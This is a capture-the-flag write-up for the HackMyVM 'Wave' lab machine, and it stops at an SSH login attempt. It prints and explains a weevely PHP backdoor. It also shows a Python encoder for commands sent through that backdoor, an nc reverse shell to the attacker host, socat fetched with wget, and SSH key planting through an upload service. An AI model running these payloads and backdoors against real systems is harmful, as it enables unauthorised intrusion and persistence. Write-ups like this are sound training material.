****# CTF Penetration Testing

## HackMyVM

### Wave - Machine

#### Machine Description

- Machine name: [Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/wave.png" alt="Wave Machine Logo" width="150"/>

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.119  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.117
192.168.56.121 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.121`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 15:20 EDT
Nmap scan report for 192.168.56.121
Host is up (0.00051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0) ←
80/tcp open  http    nginx 1.22.1 ←
MAC Address: 08:00:27:01:8E:3F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.86 seconds
```

`curl http://192.168.56.121`:
``` 
<h1> WAVE </h1>

<!-- wAvE -->
```

`gobuster dir -u http://192.168.56.121 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.121
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,jpg,txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 31]
/backup               (Status: 301) [Size: 169] [--> http://192.168.56.121/backup/]
/robots.txt           (Status: 200) [Size: 18] ←

[...]
```

`curl http://192.168.56.121/robots.txt`:
```
Disallow: /backup ←
```

`w3m http://192.168.56.121/backup`:
```
Index of /backup/

../
index.bck                                 04-Sep-2023 10:10        31
log.log                                   04-Sep-2023 10:12         4
phptest.bck                               04-Sep-2023 10:11        32
robots.bck                                04-Sep-2023 10:10        18
weevely.bck                               05-Sep-2023 09:20       515 ←
```

`wget http://192.168.56.121/backup/weevely.bck`:
```
--2024-09-20 15:33:14--  http://192.168.56.121/backup/weevely.bck
Connecting to 192.168.56.121:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 515 [application/octet-stream]
Saving to: ‘weevely.bck.1’

weevely.bck.1           100%[============================>]     515  --.-KB/s    in 0s      

2024-09-20 15:33:14 (121 MB/s) - ‘weevely.bck.1’ saved [515/515] ←
```

`cat ./weevely.bck`:
```
<?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/x�X���U��j�0ſ�)J�hB�S;���
                         �/�J��▒m�.��)��n@��.�\�]=6�&T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe���(▒��"`����5�|��H��     O����w�2%��OyTV���Q�b�A���h��=�W {��
�kЛw8�a����S�����
�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
                       ږ&'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB
```

`file ./weevely.bck`:
```
weevely.bck: PHP phar archive with SHA1 signature ←
```

`mv ./weevely.bck ./weevely.phar`

`phar extract -f ./weevely.phar`:
```
x ...ok ←
```

`ls -alps ./x`:
```
4 -rw-rw-r-- 1 kali kali 481 Sep 22 09:34 ./x ←
```

`file ./x`:
```                                                             
x: PHP script, ASCII text ←
```

`cat ./x`:
```php
<?php 
eval('
	$k = "3ddf0d5c";
	$kh = "b6e7a529b6c2";
	$kf = "d598a771749b";
	$p = "afnqDsRcBpVmU71y";
	
	function x($t, $k) {
	    $c = strlen($k);
	    $l = strlen($t);
	    $o = "";
	    for ($i = 0; $i < $l;) {
	        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
	            $o .= $t[$i] ^ $k[$j];
	        }
	    }
	    return $o;
	}
	
	if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
	    @ob_start();
	    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
	    $o = @ob_get_contents();
	    @ob_end_clean();
	    $r = @base64_encode(@x(@gzcompress($o), $k));
	    print("$p$kh$r$kf");
	}
');
```

**Explaining the PHP Backdoor Code**

This piece of code is a typical example of a **PHP backdoor** that allows an attacker to execute arbitrary commands on the server by sending them through a specially crafted HTTP request. Let's break down each section to understand how it works.

1. `eval()` and Variable Initialization

```php
eval('
	$k = "3ddf0d5c";
	$kh = "b6e7a529b6c2";
	$kf = "d598a771749b";
	$p = "afnqDsRcBpVmU71y";

[...]

');
```

- **`eval()`**: The entire backdoor is wrapped inside an `eval()` function, which interprets and executes the string as PHP code. This makes it hard to spot during static analysis since the code is executed dynamically.
    
- **Variables**:
    - `$k`: This is a key used later for XOR encryption.
    - `$kh` and `$kf`: These are markers that define a "start" and "end" pattern in the HTTP request. They're used to extract the payload from the request.
    - `$p`: This is a string used during the final output, essentially a prefix in the response.

2. The `x()` Function: XOR Encryption/Decryption

```php
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}
```

- **Purpose**: The `x()` function implements a simple XOR encryption or decryption mechanism. This is often used to obfuscate the payload.
    
- **How it works**:
    - `$t`: This is the input string (likely the command or data sent by the attacker).
    - `$k`: This is the key used to XOR the input.
    - The loop runs over the length of the input string `$t` and XORs each character with the corresponding character from the key `$k`. If the key is shorter than the input, it wraps around using modulo.
	
- **Output**: The function returns the XORed result, which can be used for either encryption or decryption, depending on whether it's applied to plain text or ciphertext.

3. Extracting the Payload

```php
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
```

- **`preg_match()`**: This regular expression searches the input received via `php://input` (which contains the raw POST request body) for data between the `$kh` (start marker) and `$kf` (end marker).
    - `(.+)`: This captures any data between these markers.
    - **Example**: If the request body contains data like `b6e7a529b6c2<encoded_payload>d598a771749b`, it extracts `<encoded_payload>`.
	
- **`@`**: The `@` operator suppresses any errors or warnings, making the backdoor harder to detect if something goes wrong (like no input being sent).

4. Decoding and Executing the Payload

```php
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
$o = @ob_get_contents();
@ob_end_clean();
```

- **`ob_start()`**: This starts output buffering to capture anything that gets printed during the execution of the payload.
    
- **`eval()`**: This evaluates the decoded and decompressed payload, which is likely a malicious command or script sent by the attacker.
    
    - **Decryption process**:
        1. `base64_decode($m[1])`: The payload is first decoded from Base64.
        2. `x()`: The decoded string is passed through the `x()` function, where it's XOR decrypted using the key `$k`.
        3. `gzuncompress()`: The decrypted string is then decompressed (since it was likely compressed using `gzcompress()`).
    
- **Result**: The final result of the decryption is executed via `eval()`, allowing the attacker to run arbitrary PHP code on the server.

5. Returning the Response

```php
$r = @base64_encode(@x(@gzcompress($o), $k));
print("$p$kh$r$kf");
```

- **Output**:
    - The output generated from the executed payload (stored in `$o`) is:
        1. Compressed using `gzcompress()`.
        2. XOR encrypted using the key `$k` via `x()`.
        3. Base64 encoded.
    
- **Response Format**:
    - The server responds with the string `$p$kh<encrypted_result>$kf`, where:
        - `$p`: Prefix string.
        - `$kh`: Start marker.
        - `<encrypted_result>`: The Base64 encoded, encrypted result of the executed command.
        - `$kf`: End marker.

**Conclusion**

This PHP backdoor listens for specially crafted HTTP POST requests containing an encoded and encrypted payload. The attacker sends a command wrapped in base64 and XOR encryption, which is then:

1. Decoded.
2. Decrypted.
3. Decompressed.
4. Evaluated and executed on the server.

The result of the command execution is then:

1. Compressed.
2. XOR encrypted.
3. Base64 encoded.
4. Sent back to the attacker in the response.

This allows the attacker to maintain persistent, interactive control over the server through HTTP requests.

`curl -I -s http://192.168.56.121/weevely.php | head -n 1`:
```
HTTP/1.1 404 Not Found ←
```

`vim ./php_extensions.list`:
```
php
php3
php4
php5
php7
php8
phtml
phar
pht
```

`ffuf -u http://192.168.56.121/weevely.EXT -w ./php_extensions.list:EXT`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.121/weevely.EXT ←
 :: Wordlist         : EXT: /home/kali/php_extensions.list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

php7                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms] ←
:: Progress: [9/9] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

`curl -I -s http://192.168.56.121/weevely.php7 | head -n 1`:
```
HTTP/1.1 200 OK ←
```

`curl -X POST http://192.168.56.121/weevely.php7 -d 'b6e7a529b6c2{TEST}d598a771749b'`:
```
afnqDsRcBpVmU71yb6e7a529b6c2S/hnZjBkNWI=d598a771749b
```

`vim ./cmd_payload.py`:
```python
#!/usr/bin/python3
import zlib
import base64
import argparse

# XOR key
key = "3ddf0d5c"
# Payload prefix and suffix
prefix = "b6e7a529b6c2"
suffix = "d598a771749b"

# XOR function
def xor_strings(input_bytes, key):
    l = len(input_bytes)
    c = len(key)
    # XOR each byte in input_bytes with the corresponding byte in the key
    result = bytes([input_bytes[i] ^ ord(key[i % c]) for i in range(l)])
    return result

# Argument parser setup
parser = argparse.ArgumentParser(description="Create an encoded payload for the command.")
parser.add_argument("--cmd", type=str, required=True, help="The command to encode, e.g. 'whoami'")
args = parser.parse_args()

# The command to be encoded
command = args.cmd
print(f"Original command: {command}")

# Step 1: Compress the command
compressed_command = zlib.compress(command.encode())
print(f"Compressed command (bytes): {compressed_command}")

# Step 2: XOR the compressed command
xored_command = xor_strings(compressed_command, key)
print(f"XORed command (bytes): {xored_command}")

# Step 3: Base64 encode the result
encoded_command = base64.b64encode(xored_command).decode()
print(f"Base64 encoded payload: {encoded_command}")

# Final output to be used in the curl command
print(f"Final payload to use: {prefix}{encoded_command}{suffix}")
```

`chmod +x ./cmd_payload.py`

<❌ Failed Step.>
`./cmd_payload.py --cmd='whoami'`:
```
Original command: whoami ←
Compressed command (bytes): b'x\x9c+\xcf\xc8O\xcc\xcd\x04\x00\x08\xfa\x02\x86'
XORed command (bytes): b'K\xf8O\xa9\xf8+\xf9\xae7dl\x9c2\xe2'
Base64 encoded payload: S/hPqfgr+a43ZGycMuI= ←
Final payload to use: b6e7a529b6c2S/hPqfgr+a43ZGycMuI=d598a771749b ←
```

`curl -X POST http://192.168.56.121/weevely.php7 -d 'b6e7a529b6c2S/hPqfgr+a43ZGycMuI=d598a771749b'`:
```
```

`curl -X POST http://192.168.56.121/weevely.php7 -d 'b6e7a529b6c2S/hPqfgr+a43ZGycMuI=d598a771749b' -v`:
```
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.56.121:80...
* Connected to 192.168.56.121 (192.168.56.121) port 80
> POST /weevely.php7 HTTP/1.1
> Host: 192.168.56.121
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 44
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 44 bytes
< HTTP/1.1 500 Internal Server Error ←
< Server: nginx/1.22.1
< Date: Mon, 23 Sep 2024 10:08:49 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
* Connection #0 to host 192.168.56.121 left intact
```
</❌ Failed Step.>

`./cmd_payload.py --cmd='system("whoami");'`:
```                
Original command: system("whoami"); ←
Compressed command (bytes): b'x\x9c+\xae,.I\xcd\xd5P*\xcf\xc8O\xcc\xcdT\xd2\xb4\x06\x00;\x18\x05\xfb'
XORed command (bytes): b'K\xf8O\xc8\x1cJ|\xae\xe64N\xa9\xf8+\xf9\xaeg\xb6\xd0`0_-f\xc8'
Base64 encoded payload: S/hPyBxKfK7mNE6p+Cv5rme20GAwXy1myA== ←
Final payload to use: b6e7a529b6c2S/hPyBxKfK7mNE6p+Cv5rme20GAwXy1myA==d598a771749b ←
```

`curl -X POST http://192.168.56.121/weevely.php7 -d 'b6e7a529b6c2S/hPyBxKfK7mNE6p+Cv5rme20GAwXy1myA==d598a771749b' -v`:
```
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.56.121:80...
* Connected to 192.168.56.121 (192.168.56.121) port 80
> POST /weevely.php7 HTTP/1.1
> Host: 192.168.56.121
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 60
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 60 bytes
< HTTP/1.1 200 OK ←
< Server: nginx/1.22.1
< Date: Mon, 23 Sep 2024 10:09:56 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
* Connection #0 to host 192.168.56.121 left intact
afnqDsRcBpVmU71yb6e7a529b6c2S/hPSR+zeCofLYBkMHXqYAQ=d598a771749b ←
```

`vim ./output_decoding.php`:
```php
<?php

// XOR function
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}

// Decodes the input string
function decode_payload($encoded_string, $key, $kh, $kf) {
    // Extract $r part from the $p$kh$r$kf string
    if (preg_match("/$kh(.+)$kf/", $encoded_string, $matches)) {
        $r = $matches[1]; // Extract the $r part
        // Base64 decode, apply XOR and gzuncompress
        $decoded_r = base64_decode($r);
        $xored = x($decoded_r, $key);
        $o = gzuncompress($xored);
        return $o; // Return the decoded result
    } else {
        return "Invalid format.";
    }
}

// Argument handling for command line input
if ($argc < 2) {
    echo "Usage: php " . $argv[0] . " <encoded_string>\n";
    exit(1);
}

// Variables
$key = "3ddf0d5c"; // Key used in the XOR function
$kh = "b6e7a529b6c2"; // Prefix
$kf = "d598a771749b"; // Suffix
$encoded_string = $argv[1]; // Take the encoded string as a command-line argument

// Decode and print the result
$decoded_result = decode_payload($encoded_string, $key, $kh, $kf);
echo "Decoded result: " . $decoded_result . "\n";

?>
```

`php ./output_decoding.php`:
```
Decoded result: www-data ←
```

`nc -lnvp 4444`:
```          
listening on [any] 4444 ... ←
```

`./cmd_payload.py --cmd='system("nc -c /bin/bash 192.168.56.118 4444");'`:
```
Original command: system("nc -c /bin/bash 192.168.56.118 4444"); ←
Compressed command (bytes): b'x\x9c+\xae,.I\xcd\xd5P\xcaKV\xd0MV\xd0O\xca\xcc\xd3OJ,\xceP0\xb44\xd234\xb3\xd035\xd334\xb4P0\x01\x02%Mk\x00F\xc5\x0c&'
XORed command (bytes): b'K\xf8O\xc8\x1cJ|\xae\xe64\xae-f\xb4x5\xe3+\xae\xaa\xe3+\x7fO\xfd4T\xd2\x04\xb6\x06W\x80\xb4WS\xe3W\x01\xd7cTed\x15)^cu\xa1h@'
Base64 encoded payload: S/hPyBxKfK7mNK4tZrR4NeMrrqrjK39P/TRU0gS2BleAtFdT41cB12NUZWQVKV5jdaFoQA== ←
Final payload to use: b6e7a529b6c2S/hPyBxKfK7mNK4tZrR4NeMrrqrjK39P/TRU0gS2BleAtFdT41cB12NUZWQVKV5jdaFoQA==d598a771749b ←
```

`curl -X POST http://192.168.56.121/weevely.php7 -d 'b6e7a529b6c2S/hPyBxKfK7mNK4tZrR4NeMrrqrjK39P/TRU0gS2BleAtFdT41cB12NUZWQVKV5jdaFoQA==d598a771749b'`

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.121] 58796 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
www-data ←
```

`uname -a`:
```
Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64 GNU/Linux
```

`ls -alps /home`:
```
total 16
4 drwxr-xr-x  4 root  root  4096 Sep  4  2023 ./
4 drwxr-xr-x 18 root  root  4096 Sep  4  2023 ../
4 drwx------  3 angie angie 4096 Sep  5  2023 angie/ ←
4 drwx------  2 carla carla 4096 Sep  4  2023 carla/ ←
```

`ls -alps /home/angie`:
```
ls: cannot open directory '/home/angie': Permission denied ←
```

`ls -alps /home/carla`:
```
ls: cannot open directory '/home/carla': Permission denied ←
```

`ss -tunlp`:
```
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*                                                                                      
tcp     LISTEN   0        1024           127.0.0.1:3923 ←        0.0.0.0:*                                                                                    
tcp     LISTEN   0        1                0.0.0.0:1234          0.0.0.0:*       users:(("nc",pid=602,fd=3))                                                    
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        511              0.0.0.0:80            0.0.0.0:*       users:(("nginx",pid=476,fd=5))                                                 
tcp     LISTEN   0        128                 [::]:22               [::]:*                                                                                      
tcp     LISTEN   0        511                 [::]:80               [::]:*       users:(("nginx",pid=476,fd=6)) 
```

`lsof -i :3923`:
```
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nc      1008 www-data    3u  IPv4  34255      0t0  TCP localhost:50404->localhost:3923 (ESTABLISHED) ←
```

`nc 127.0.0.1 3923`:
```
HTTP/1.1 400 Bad Request ←

need at least 4 bytes in the first packet; got 1 ←
```

`ip addr`:
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo ←
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:01:8e:3f brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.121/24 brd 192.168.56.255 scope global dynamic enp0s3 ←
       valid_lft 386sec preferred_lft 386sec
    inet6 fe80::a00:27ff:fe01:8e3f/64 scope link 
       valid_lft forever preferred_lft forever
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd /home/kali/tools`

`ls -alps ./`:
```
total 10060
   4 drwxrwxr-x 2 kali kali    4096 Sep 23 09:43 ./
   4 drwxr-xr-x 8 kali kali    4096 Sep 14 10:40 ../
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r-- 1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r-- 1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 844 -rwxr-xr-x 1 kali kali  860337 Sep 20 04:02 linpeas.sh
  48 -rw-rw-r-- 1 kali kali   48875 Sep 19 12:45 lse.sh
  60 -rw-r--r-- 1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r-- 1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r-- 1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r-- 1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rwxrwxr-x 1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r-- 1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
 368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat ←
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cd /tmp`

`wget http://192.168.56.118/socat`:
```
--2024-09-23 15:46:32--  http://192.168.56.118/socat
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat               100%[===================>] 366.38K  --.-KB/s    in 0.006s  

2024-09-23 15:46:32 (60.8 MB/s) - ‘socat’ saved [375176/375176] ←
```

`chmod +x ./socat`

`./socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:3923`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nmap -Pn -sSV -p8888 -T5 192.168.56.121`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 09:56 EDT
WARNING: Service 192.168.56.121:8888 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 192.168.56.121
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
8888/tcp open  rtsp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=9/23%Time=66F173AC%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1138,"HTTP/1\.0\x20200\x20OK\r\nContent-Length:\x204209\r\n
SF:Connection:\x20Close\r\nDate:\x20Mon,\x2023\x20Sep\x202024\x2013:52:51\
SF:x20GMT\r\nVary:\x20Origin,\x20PW,\x20Cookie\r\nCache-Control:\x20no-sto
SF:re,\x20max-age=0\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\n<head>\n\t<meta\x20charse
SF:t=\"utf-8\">\n\t<title>wave\x20</title>\n\t<meta\x20http-equiv=\"X-UA-C
SF:ompatible\"\x20content=\"IE=edge\">\n\t<meta\x20name=\"viewport\"\x20co
SF:ntent=\"width=device-width,\x20initial-scale=0\.8,\x20minimum-scale=0\.
SF:6\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#333\">\n\n\t<link\x
SF:20rel=\"stylesheet\"\x20media=\"screen\"\x20href=\"/\.cpr/ui\.css\?_=8R
SF:_W\">\n\t<link\x20rel=\"stylesheet\"\x20media=\"screen\"\x20href=\"/\.c
SF:pr/browser\.css\?_=8R_W\">\n</head>\n\n<body>\n\t<div\x20id=\"ops\"></d
SF:iv>\n\n\t<div\x20id=\"op_search\"\x20class=\"opview\">\n\t\t<div\x20id=
SF:\"srch_form\"\x20class=\"opbox\"></div>\n\t\t<div\x20id=\"srch_q\"></di
SF:v>\n\t</div>\n\n\t<div\x20id=\"op_player\"\x20class=\"opview\x20opbox\x
SF:20opwide\"></div>\n\n\t<div\x20id=\"op_bup\"\x20class=\"opview\x20opbox
SF:\x20act\">\n\t\t<div\x20id=\"u2err\"></div>\n\t\t<for")%r(HTTPOptions,1
SF:47,"HTTP/1\.0\x20200\x20OK\r\nContent-Length:\x200\r\nConnection:\x20Cl
SF:ose\r\nDate:\x20Mon,\x2023\x20Sep\x202024\x2013:52:51\x20GMT\r\nVary:\x
SF:20Origin,\x20PW,\x20Cookie\r\nCache-Control:\x20no-store,\x20max-age=0\
SF:r\nAllow:\x20GET,\x20HEAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS,\x20P
SF:ROPFIND,\x20PROPPATCH,\x20LOCK,\x20UNLOCK,\x20MKCOL,\x20COPY,\x20MOVE\r
SF:\nDav:\x201,\x202\r\nMs-Author-Via:\x20DAV\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\n\r\n")%r(RTSPRequest,14C,"RTSP/1\.0\x20200\x20OK
SF:\r\nContent-Length:\x200\r\nConnection:\x20Keep-Alive\r\nDate:\x20Mon,\
SF:x2023\x20Sep\x202024\x2013:52:51\x20GMT\r\nVary:\x20Origin,\x20PW,\x20C
SF:ookie\r\nCache-Control:\x20no-store,\x20max-age=0\r\nAllow:\x20GET,\x20
SF:HEAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS,\x20PROPFIND,\x20PROPPATCH
SF:,\x20LOCK,\x20UNLOCK,\x20MKCOL,\x20COPY,\x20MOVE\r\nDav:\x201,\x202\r\n
SF:Ms-Author-Via:\x20DAV\r\nContent-Type:\x20text/html;\x20charset=utf-8\r
SF:\n\r\n");
MAC Address: 08:00:27:01:8E:3F (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds
```

`w3m http://192.168.56.121:8888/`:
```
__________________________________
[make directory]

__________________________________
[start upload]


c  File Name              Size      T        Date
-- ---------------------  --------  -------- -------------------
   copyparty-sfx.py       646042    py       2023-09-02 00:54:31
   user.txt               24        txt      2023-09-04 10:16:28


wave // 16.7 GiB free of 18.5 GiB
```

`cd /tmp`

`ssh-keygen -t rsa`:
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): wave 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in wave
Your public key has been saved in wave.pub
The key fingerprint is:
SHA256:cJeelgOoQ/dt2EIR12Gb+niGia8osIz8msPbf4aK5dA kali@kali-vm
The key's randomart image is:
+---[RSA 3072]----+
|        o...o.   |
|       . o o.o   |
|    . + + o o    |
|   . o = B +     |
|    o   S @      |
|  o  .   = *     |
|o+ E  . . + +    |
|.+X .. + . o     |
| ===oo+ ...      |
+----[SHA256]-----+
```

`ls -alps ./`:
```
ls -alps ./
total 8
0 drwxrwxr-x  2 kali kali   80 Sep 23 10:08 ./
0 drwxrwxrwt 15 root root  360 Sep 23 10:08 ../
4 -rw-------  1 kali kali 2602 Sep 23 10:08 wave
4 -rw-r--r--  1 kali kali  566 Sep 23 10:08 wave.pub ←
```

`mv ./wave ./id_rsa`

`mv ./wave.pub ./authorized_keys`

`w3m http://192.168.56.121:8888/`:
```
.ssh______________________________ ←
[make directory] ←

__________________________________
[start upload]


c  File Name              Size      T        Date
-- ---------------------  --------  -------- -------------------
   copyparty-sfx.py       646042    py       2023-09-02 00:54:31
   user.txt               24        txt      2023-09-04 10:16:28


wave // 16.7 GiB free of 18.5 GiB
```
```
__________________________________
[make directory] ←

/tmp/authorized_keys______________ ←
[start upload] ←


c  File Name              Size      T        Date
-- ---------------------  --------  -------- -------------------
   copyparty-sfx.py       646042    py       2023-09-02 00:54:31
   user.txt               24        txt      2023-09-04 10:16:28


wave // 16.7 GiB free of 18.5 GiB
```
```
upload these 2 files to /.ssh
   • authorized_keys ←

[Cancel]
[OK] ←
```

`ssh angie@192.168.56.121 -i /tmp/id_rsa`:
```
